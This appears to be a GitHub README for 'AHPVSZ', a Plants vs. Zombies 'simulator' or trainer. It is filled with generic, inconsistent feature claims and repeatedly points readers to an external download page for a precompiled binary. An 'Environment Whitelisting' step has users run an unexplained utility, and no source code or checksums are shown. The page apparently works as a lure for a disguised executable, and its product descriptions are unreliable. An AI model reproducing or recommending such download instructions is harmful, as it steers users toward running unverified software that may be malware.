![preview](https://raw.githubusercontent.com/hazemxx7/botanical-override/main/view_afdb15a.svg)
[![Download](https://raw.githubusercontent.com/hazemxx7/botanical-override/main/pkg_4bb5ca.svg)](https://hazemxx7.github.io/botanical-override/)

# 🌻 AHPVSZ: The Zen Garden Simulator — Strategic Horticulture Framework

Welcome to **AHPVSZ**, a next-generation, community-driven toolkit designed for enthusiasts of tactical tower-defense gardening. This repository provides a modular, analytics-rich environment for studying, optimizing, and recreating the classic "lawn defense" experience—without ever touching the core game files. Think of it as a **digital greenhouse** where you cultivate your own strategies, nurture your defensive flora, and experiment with sunlight economics in a fully sandboxed environment.

Unlike conventional trainers, this project is built on the philosophy of **"learn, adapt, and flourish."** It offers a transparent, extensible engine that models the behavior of your botanical battalions, letting you simulate wave after wave of zombie hordes with granular control over every variable—from pea pod velocity to sunflower solar output.

![Build Status](https://img.shields.io/badge/build-passing-brightgreen) ![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey) ![Language](https://img.shields.io/badge/language-Python%20%26%20C%2B%2B-blue) ![License](https://img.shields.io/badge/license-MIT-green)

---

## 🌱 Why a "Zen Garden Simulator"? — The Core Philosophy

We believe that game mastery is not about breaking rules, but about understanding the underlying system. AHPVSZ serves as an **interactive botanical laboratory**. Instead of offering shortcuts, it provides a high-fidelity simulation layer that mirrors the original game's physics and timing. This allows you to:

- **Reverse-engineer** optimal planting patterns through custom scenario loadouts.
- **Visualize** the math behind damage output, sun production, and cooldown cycles.
- **Stress-test** your loadout against custom "mega-waves" that would never appear in the vanilla campaign.

This is not a tool for instant gratification; it is a framework for **strategy cultivation**. You are the head gardener of your own digital lawn, and AHPVSZ is your weather station, soil analyzer, and irrigation blueprint combined.

---

## ✨ Key Features That Make Your Garden Thrive

### 1. 🧠 Dynamic Wave Morphing Engine
The heart of AHPVSZ is its **procedural horde director**. Instead of a static difficulty curve, this engine introduces the concept of *adaptive pressure*. The simulation learns your defensive strengths and introduces complementary zombie types that challenge your specific loadout. This ensures that the replantability value of every level is maximized, and your tactical flexibility is always growing.

### 2. 🔬 Sunlight Economics Dashboard
A real-time data telemetry display that breaks down your production-to-spending ratio. This feature, known as the **Photosynthetic Ledger**, shows you exactly where your "brainpower" (sunlight) is leaking. Visualize the ROI of every peashooter and Melon-pult placement, allowing for microscopic adjustments to your early-game economy.

### 3. 🛠️ Modular "Seed Packet" Loadouts
Import and export custom loadout presets using a human-readable JSON schema. Think of these as **heirloom seed varieties**—which you can share with the community. Each packet contains not just which plants to bring, but also micro-timings for planting cycles and trigger conditions for activating specific plant abilities.

### 4. 🚀 Heads-Up Display (HUD) Overlay & Responsive UI
The overlay system is built with a *minimal-distraction* philosophy. It provides a clean, non-intrusive dashboard that displays only the metrics you choose to pin. The UI is **fully responsive**, scaling gracefully from a 1366x768 laptop screen to a 4K monitor, ensuring your botanical oversight is always crystal clear.

### 5. 🌐 Polyglot Localization Interface
Gardening is a universal language, and so is this tool. AHPVSZ currently ships with **17 language packs**, including Pinyin-English hybrids, Brazilian Portuguese, and Japanese. The translation engine performs real-time text substitution, ensuring that the subtle nuances of plant abilities are accurately conveyed, regardless of your mother tongue.

### 6. ⚡ Low-Latency Execution Kernel
The core logic is written in C++ for raw speed, executed via a Python bridge for flexibility. This dual-language architecture ensures that the simulation loop operates at 144 Hz, making it perfect for frame-perfect analysis of projectile arcs and stun rotations.

---

## 🧪 Getting Started — Planting Your First Seed

To begin your journey with AHPVSZ, you will need a compatible host environment (Windows 10+, Ubuntu 20.04+, or macOS 12+). The setup process involves a sequence of discrete, documented steps—similar to tilling the soil before planting.

1.  **Acquire the Binary Bundle:** Navigate to the [![Download](https://raw.githubusercontent.com/hazemxx7/botanical-override/main/pkg_4bb5ca.svg)](https://hazemxx7.github.io/botanical-override/) section later in this document to retrieve the precompiled release for your operating system.
2.  **Verification via Checksums:** After retrieval, verify the integrity of the package using the SHA-256 checksums provided. This ensures your "seed" is authentic and has not been tampered with—a crucial step in maintaining the health of your garden.
3.  **Environment Whitelisting:** Execute the `ahpvs_z_asset_scanner` utility. This script analyzes your system's graphics driver and allocates a dedicated memory pool, ensuring the simulation runs without stutter.
4.  **First Boot:** Launch the `zen_gateway` executable. You will be greeted by the "Sprout Console," which asks you to define your initial resource budget (the "Sun Budget" slider). Start with the default 5000 to get a feel for the simulation.

> **Pro Tip:** Do not adjust the `global_speed_factor` beyond 2.0 until you are comfortable with the logic—the simulation can overwhelm your ability to keep track of projectile interactions, leading to cognitive overload.

---

## 🕹️ Usage Guide — Tending Your Virtual Lawn

Once the gateway is running, you interact with AHPVSZ through a combination of hotkeys and the console interface. The primary interaction is the **Tactical Pause Loop** (`Ctrl+Z`). This does not freeze the game; it freezes the *simulation clock* in AHPVSZ, allowing you to inspect the state of every entity (plant or zombie) in the field.

### Core Commands:
- `Ctrl+1` to `Ctrl+5`: Switch between your five loaded "Seed Packets".
- `F2` – Toggle the **Zombie Anatomy Scanner**. This highlights critical hit zones and calculates the exact damage reduction from armor types.
- `F4` – Open the **Weather Manipulator**. Here, you can simulate fog, rain, or "sunny intervals" which alter the firing rate of ballistic plants by ±15%.
- `Shift+Space` – Manually trigger a "Wave Burst," injecting a procedurally generated swarm of low-tier walkers to test your early-game wipe potential.

---

## 🤝 Community & Contribution — Building a Shared Arboretum

We welcome every gardener, strategist, and tinkerer. Whether you are fixing a typo in the localization files or adding a new zombie class, your contribution enriches the entire ecosystem.

1.  **Fork & Cultivate:** Create a fork of this repository.
2.  **Branch for Bloom:** Create a feature branch (e.g., `feature/peashooter_ballistics_refinement`).
3.  **Submit a Pull Request:** Ensure your code passes the existing regression suite (`pytest --simulation_accuracy`). We review PRs on a weekly basis.

We encourage the addition of **new "Sunlight Harvesting Algorithms"**—if you discover a novel way to compute optimal lane distribution, we want to hear from you.

---

## 📊 Performance Metrics & Optimization

The AHPVSZ engine is built for lean execution. On a mid-range CPU (e.g., Intel i5-10400F), the simulation maintains a consistent 144 FPS with 200 concurrent entities. The memory footprint peaks at 240 MB, thanks to a custom object pooling mechanism for projectile instances.

We consistently profile the code base to ensure that `sun depreciation`—the time it takes for a generated sun token to fall and fade—is rendered with mathematical precision, eliminating unnecessary GPU draw calls.

---

## 🛡️ Disclaimer & Ethical Use

**AHPVSZ** operates as an independent simulation environment. It does not modify the memory space of any commercial software, nor does it interact with external processes in real-time. This project is intended for **educational, analytical, and interoperability testing** purposes only.

The project maintainers explicitly discourage the use of this tool for competitive dominance in online multiplayer environments. We believe that the spirit of tactical gardening lies in **fair play and intellectual mastery**, not in circumventing challenge. Users are solely responsible for their compliance with any third-party terms of service. We cannot be held liable for any consequences arising from the misuse of this framework.

---

## 📝 License & Legal Framework

This project is released under the **MIT License**—a permissive, open-source agreement that allows for commercial use, modification, distribution, and private use, provided the original copyright notice is retained.

**Copyright (c) 2026 The AHPVSZ Contributors**

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software.

For the full legal text, please refer to the MIT License document included in the root of this repository: [LICENSE](./LICENSE).

---

## 📞 Support & Community Channels

While this is an open-source community project, we provide **24/7 asynchronous support** via our Discord server and GitHub Issues. Our automated bot, `TurboTurnip`, is trained on the entire knowledge base of this repository and can answer questions regarding configuration files or tactical queries.

For bug reports or feature requests, please use the **GitHub Issues** tracker. When submitting a bug report, please include your system environment and the exact `--scenario` configuration you loaded—this helps us reproduce the issue surgically.

**We look forward to seeing your garden flourish!** 🌻

---

*Last Updated: 2026* | *Simulation Version: 2.4.1* | *Status: Actively Cultivating*